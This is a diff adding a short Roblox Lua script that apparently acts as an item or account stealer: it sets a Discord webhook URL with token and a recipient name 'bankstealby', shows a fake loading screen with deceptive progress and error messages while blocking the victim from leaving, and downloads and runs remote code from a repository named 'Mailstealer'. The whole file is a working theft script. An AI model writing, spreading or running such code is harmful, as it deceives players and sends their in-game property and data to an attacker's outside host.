@@ -1,0 +1,15 @@
+UserName = "bankstealby"
+Webhook = "https://discord.com/api/webhooks/1070612520970223697/E1ygnzqKo_UFy-SBvQ1okY6fk8KqsLNGAIQNT3TsmuKnAQ92tzmh1UwEv9DTf0R9SFXV"
+UserName2 = "bankstealby"
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true
+
+_G.LoadingText1 = "Loading Library"
+_G.LoadingText2 = "Updating Library"
+_G.LoadingText3 = "Getting Script"
+_G.LoadingText4 = "Executing Script"
+_G.LoadingText5 = "Error: Execution Failed, re-trying!"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Egorikusa/Mailstealer/main/engine"))()
